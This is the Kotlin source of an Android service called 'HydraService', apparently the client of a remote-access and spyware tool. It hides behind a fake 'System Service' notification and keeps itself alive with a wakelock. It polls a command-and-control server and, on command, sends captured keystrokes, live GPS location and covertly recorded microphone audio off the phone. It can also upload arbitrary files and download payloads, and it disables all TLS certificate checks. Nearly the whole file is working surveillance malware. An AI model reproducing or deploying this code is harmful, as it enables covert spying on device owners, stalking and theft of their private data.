
/*
Copyright (c) 2026 José María Micoli
Licensed under AGPLv3

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

package com.hydra.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.*
import java.net.HttpURLConnection
import java.net.URL

class HydraService : Service() {
    private val TAG = "Hydra"
    private val DEBUG_TAG = "Hydra-DEBUG"
    private val client = unsafeOkHttpClient()
    private val handler = Handler(Looper.getMainLooper())
    private val heartbeatInterval = 60000L
    private var wakeLock: PowerManager.WakeLock? = null
    private val serverBaseUrl = "https://192.168.0.207:8443"

    // --- Audio Surveillance VARIABLES ---
    private val audioHelper by lazy { AudioHelper(this) }
    private var currentRecordingPath: String? = null
    
    // --- LIVE TRACKING VARIABLES ---
    private var isTracking = false
    private val trackingInterval = 30000L 
    private val locationHelper by lazy { LocationHelper(this) }

    private val checkInRunnable = object : Runnable {
        override fun run() {
            performCheckIn()
            handler.postDelayed(this, heartbeatInterval)
        }
    }

    // --- KEYLOG RECEIVER ---
    private val keylogReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val payload = intent?.getStringExtra("payload") ?: "Empty Payload" // Default if null
            
            val reportJson = JSONObject()
            reportJson.put("type", "keylog")
            reportJson.put("data", payload) // Use "data" to match server logic

            val body = reportJson.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$serverBaseUrl/report/ANDROID-HEAD-01")
                .post(body)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "[-] Exfil Failed: ${e.message}")
                }
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        }
    }

    // --- LIVE TRACKING RUNNABLE ---
    private val locationTrackingRunnable = object : Runnable {
        override fun run() {
            if (isTracking) {
                locationHelper.getCurrentLocation { report ->
                    sendReport("location_update", "[LIVE] $report")
                }
                handler.postDelayed(this, trackingInterval)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        
        // 1. Setup Wakelock: Critical for Android 11 background persistence
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hydra::Wakelock")
        // Keep it alive for 10 mins or until release
        wakeLock?.acquire(10 * 60 * 1000L) 

        // 2. Start Foreground Notification (Mandatory for background survival)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("hydra_service", "System Update", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
        
        val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "hydra_service")
                .setContentTitle("System Service")
                .setContentText("Running diagnostic check...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("System Service")
                .build()
        }
        
        //Promote to foreground so the OS doesn't kill the BroadcastReceiver
        startForeground(1, notification)

        // 3. Register Keylog Receiver (The "Ear")
        val filter = IntentFilter("com.hydra.ACTION_KEYLOG")
        
        // For Android 11, registerReceiver works normally, 
        // but we keep the Tiramisu check for future-proofing.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(keylogReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(keylogReceiver, filter)
        }

        // 4. Start Heartbeat & Location logic
        handler.post(checkInRunnable)
        handler.post(locationTrackingRunnable)
        
        Log.i(TAG, "Hydra Service Created - Keylog Receiver Active & Exported")
    }

    private fun startMyForegroundService() {
        val channelId = "hydra_c2_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Hydra System Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = Notification.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Hydra connectivity active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()

        startForeground(1, notification)
    }

    private fun getNetworkName(): String {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return "Disconnected"
            val capabilities = cm.getNetworkCapabilities(network) ?: return "Disconnected"

            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                val info = wifiManager.connectionInfo
                val ssid = info.ssid.replace("\"", "")
                if (ssid == "<unknown ssid>") "WiFi (No Permission)" else ssid
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                telephonyManager.networkOperatorName ?: "Cellular"
            } else {
                "Unknown Transport"
            }
        } catch (e: Exception) { "Network Error" }
    }

    private fun getBatteryLevel(): String {
        val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
    }

    fun uploadFile(filePath: String, clientId: String, serverUrl: String) {
        val file = File(filePath)
        if (!file.exists()) {
            Log.e(TAG, "[-] File does not exist: $filePath")
            return
        }

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
            .build()

        val request = Request.Builder()
            .url("$serverUrl/upload/$clientId")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "[-] Upload Failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.i(TAG, "[+] Upload Successful: ${file.name}")
                response.close()
            }
        })
    }

    fun downloadFile(filename: String, serverUrl: String, context: Context) {
        val request = Request.Builder()
            .url("$serverUrl/download/$filename")
            .get()
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "[-] Download Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    val body = response.body
                    if (body != null) {
                        try {
                            val destinationFile = File(context.filesDir, filename)
                            val outputStream = FileOutputStream(destinationFile)
                            outputStream.write(body.bytes())
                            outputStream.close()
                            Log.i(TAG, "[+] Downloaded and saved to: ${destinationFile.absolutePath}")
                        } catch (e: Exception) {
                            Log.e(TAG, "[-] Error saving file: ${e.message}")
                        }
                    }
                }
                response.close()
            }
        })
    }

    private fun performCheckIn() {
        val url = "$serverBaseUrl/checkin/ANDROID-HEAD-01?platform=android"
        
        val telemetry = JSONObject()
        telemetry.put("hostname", "${Build.MANUFACTURER} ${Build.MODEL}")
        telemetry.put("os_version", "Android ${Build.VERSION.RELEASE}")
        telemetry.put("network", getNetworkName())
        telemetry.put("battery", getBatteryLevel())

        val body = telemetry.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val responseData = response.body?.string()
                if (response.isSuccessful && responseData != null) {
                    Log.i(TAG, "Check-in Successful")
                    parseCommand(responseData)
                }
                response.close()
            }
        })
    }

    private fun parseCommand(jsonData: String) {
        try {
            Log.i(DEBUG_TAG, "RAW JSON RECEIVED: $jsonData")

            val json = JSONObject(jsonData)
            if (json.has("command") && !json.isNull("command")) {
                val cmd = json.getJSONObject("command")
                val action = cmd.getString("action")
                val data = cmd.optJSONObject("data") ?: JSONObject()

                Log.i(TAG, "[!] Action detected: $action")

                when (action) {
                    "keylog_start" -> {
                        // Since we registered it in onCreate, it's already listening, 
                        // but we can add a log or a flag here to confirm
                        Log.i(TAG, "[+] Keylogging mission active")
                        sendReport("status", "Keylogger is now armed")
                    }
                    "keylog_stop" -> {
                        Log.i(TAG, "[-] Keylogging mission suspended")
                        // Optionally unregister here if you want to be stealthy
                        sendReport("status", "Keylogger has been disarmed")
                    }
                    "record_start" -> {
                        currentRecordingPath = audioHelper.startRecording()
                        if (currentRecordingPath != null) {
                            sendReport("audio_status", "Recording environment...")
                        }
                    }
                    "record_stop" -> {
                        val finalPath = audioHelper.stopRecording()
                        if (finalPath != null) {
                            uploadFile(finalPath, "ANDROID-HEAD-01", serverBaseUrl)
                            sendReport("audio_status", "Recording exfiltrated: $finalPath")
                        }
                    }
                    "location" -> {
                        locationHelper.getCurrentLocation { report ->
                            sendReport("location_update", report)
                        }
                    }
                    "location_start" -> {
                        if (!isTracking) {
                            isTracking = true
                            handler.post(locationTrackingRunnable)
                            Log.i(TAG, "[+] Live tracking started")
                        }
                    }
                    "location_stop" -> {
                        isTracking = false
                        handler.removeCallbacks(locationTrackingRunnable)
                        Log.i(TAG, "[-] Live tracking stopped")
                    }
                    "download" -> {
                        val filename = data.optString("filename", "payload.bin")
                        downloadFile(filename, serverBaseUrl, this)
                    }
                    "upload" -> {
                        val path = data.optString("path", "")
                        if (path.isNotEmpty()) uploadFile(path, "ANDROID-HEAD-01", serverBaseUrl)
                    }
                    "vibrate" -> {
                        val duration = data.optLong("duration", 1000L)
                        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION")
                            vibrator.vibrate(duration)
                        }
                    }
                    "msg" -> {
                        val content = data.optString("content", "Hello from Server")
                        handler.post {
                            Toast.makeText(applicationContext, content, Toast.LENGTH_LONG).show()
                        }
                    }
                }
            } else {
                Log.d(TAG, "No pending command.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing command: ${e.message}")
        }
    }

    private fun sendReport(type: String, data: String) {
        val url = "$serverBaseUrl/report/ANDROID-HEAD-01"
        val reportJson = JSONObject()
        reportJson.put("type", type)
        reportJson.put("data", data)

        val body = reportJson.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "[-] Failed to send report: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.i(TAG, "[+] Report sent: $type")
                response.close()
            }
        })
    }

    override fun onDestroy() {
        handler.removeCallbacks(checkInRunnable)
        handler.removeCallbacks(locationTrackingRunnable)
        try {
            unregisterReceiver(keylogReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Receiver error during destroy")
        }
        if (wakeLock?.isHeld == true) wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun unsafeOkHttpClient(): OkHttpClient {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val sslContext = SSLContext.getInstance("SSL").apply {
            init(null, trustAllCerts, SecureRandom())
        }
        return OkHttpClient.Builder()
            .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
            .hostnameVerifier { _, _ -> true }
            .build()
    }
}